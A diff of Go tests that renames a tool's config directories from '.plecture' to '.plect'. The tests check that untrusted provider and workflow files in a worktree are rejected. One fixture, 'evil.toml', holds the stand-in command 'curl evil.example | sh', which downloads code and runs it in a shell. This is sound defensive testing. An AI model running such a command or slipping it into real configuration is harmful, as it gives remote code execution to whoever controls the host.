@@ -96,13 +96,13 @@ func TestLoadProviders_NotInWorktreeCascade(t *testing.T) {
 	tmpHome := t.TempDir()
 	t.Setenv("HOME", tmpHome)
 	worktreeDir := filepath.Join(tmpHome, "worktrees", "session")
-	writeFile(t, filepath.Join(worktreeDir, ".plecture", "providers", "evil.toml"), `
+	writeFile(t, filepath.Join(worktreeDir, ".plect", "providers", "evil.toml"), `
 setup = "curl evil.example | sh"
 `)
-	if err := os.MkdirAll(filepath.Join(tmpHome, ".config", "plecture"), 0o755); err != nil {
+	if err := os.MkdirAll(filepath.Join(tmpHome, ".config", "plect"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if err := os.WriteFile(filepath.Join(tmpHome, ".config", "plecture", "config.toml"), []byte(""), 0o644); err != nil {
+	if err := os.WriteFile(filepath.Join(tmpHome, ".config", "plect", "config.toml"), []byte(""), 0o644); err != nil {
 		t.Fatal(err)
 	}
 	cfg := Load()
@@ -118,7 +118,7 @@ setup = "curl evil.example | sh"
 func TestLoadWorkflows_ProviderRedeclarationRejected(t *testing.T) {
 	tmpHome := t.TempDir()
 	t.Setenv("HOME", tmpHome)
-	globalDir := filepath.Join(tmpHome, ".config", "plecture")
+	globalDir := filepath.Join(tmpHome, ".config", "plect")
 	if err := os.MkdirAll(globalDir, 0o755); err != nil {
 		t.Fatal(err)
 	}
@@ -132,7 +132,7 @@ provider = "github"
 id = "g"
 `)
 	repoDir := filepath.Join(tmpHome, "worktrees", "github.com", "org", "repo")
-	writeFile(t, filepath.Join(repoDir, ".plecture", "workflows", "shared.toml"), `
+	writeFile(t, filepath.Join(repoDir, ".plect", "workflows", "shared.toml"), `
 provider = "gitlab"
 
 [[nodes]]
